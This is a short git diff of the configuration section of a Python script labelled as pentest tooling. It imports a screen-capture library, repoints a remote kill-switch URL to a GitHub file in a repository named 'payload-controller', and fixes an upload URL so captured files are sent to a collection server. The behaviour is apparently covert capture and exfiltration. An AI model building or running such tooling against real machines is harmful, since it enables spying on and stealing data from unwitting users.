@@ -11,9 +11,9 @@ from PIL import ImageGrab  # For screen capture
 
 # === CONFIGURATION ===
 LOG_DIR = "pentest_logs"
-KILL_SWITCH_URL = "http://yourserver.com/kill.txt"  # Change this
-UPLOAD_URL = "http:// 192.168.112.1:8000"  # Point to server.py
-ENABLE_UPLOAD = True  # Set True if you want files sent back
+KILL_SWITCH_URL = "https://raw.githubusercontent.com/minizyperx/payload-controller/main/kill.txt"  # ✅ YOUR KILL SWITCH
+UPLOAD_URL = "http://192.168.112.1:8000"  # ✅ FIXED URL
+ENABLE_UPLOAD = True  # Toggle file uploads
 
 # === SETUP ===
 os.makedirs(LOG_DIR, exist_ok=True)
